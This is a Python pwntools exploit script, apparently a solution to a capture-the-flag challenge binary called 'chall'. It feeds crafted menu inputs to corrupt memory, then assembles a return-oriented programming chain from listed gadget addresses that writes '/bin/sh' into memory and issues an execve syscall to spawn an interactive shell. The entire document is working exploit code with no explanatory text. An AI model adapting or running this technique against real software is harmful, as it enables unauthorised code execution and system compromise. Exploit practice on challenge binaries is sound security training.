from pwn import *


elf = context.binary = ELF("./chall")


CALL_OFFSET = 72
FREE_OFFSET = 48

p = process()


p.sendline("255")

for i in range(48 // 4):
    p.sendline("1")
    p.sendline("50")
    p.sendline("50")


p.sendline("2")
p.sendline(str(40))
p.sendline(str(40))

p.sendline("2")
p.sendline(str(40))
p.sendline(str(40))

for i in range(4):
    p.sendline("1")
    p.sendline(str(40 + i))
    p.sendline(str(40))




# 0x000000000044db34 : pop rax ; ret
# 0x0000000000401b73 : pop rdi ; ret
# 0x0000000000401c87 : pop rsi ; ret
# 0x0000000000437a85 : pop rdx ; ret
# 0x000000000044526e : mov qword ptr [rax], rdx ; ret

SYSCALL = 0x0000000000400488
POP_RAX = 0x000000000044db34 
POP_RDI = 0x0000000000401b73 
POP_RSI = 0x0000000000401c87 
POP_RDX = 0x0000000000437a85 
MOV_PTR = 0x000000000044526e

RET = 0x00000000004001c7  



payload = [POP_RAX,0x6c2000,POP_RDX,0x6e69622f,MOV_PTR,POP_RAX,0x6c2004,POP_RDX,0x68732f,MOV_PTR,POP_RAX,0x3b,POP_RDI,0x6c2000,POP_RSI,0,POP_RDX,0,SYSCALL]


for idx , val in enumerate(payload):
    print("---------------------> ",hex(val))
    if val - 40 < 0x27:
        p.sendline("2")
        p.sendline(str(val + 0x27 + 1))
        p.sendline(str(0x27 + 1))

        p.sendline("2")
        p.sendline(str(40))
        p.sendline(str(40))


    else:
        p.sendline("1")
        p.sendline(str(val - 40))
        p.sendline(str(40))
        p.sendline("2")
        p.sendline(str(40))
        p.sendline(str(40))


p.sendline("2")
p.sendline(str(40))
p.sendline(str(40))



# gdb.attach(p)

p.interactive()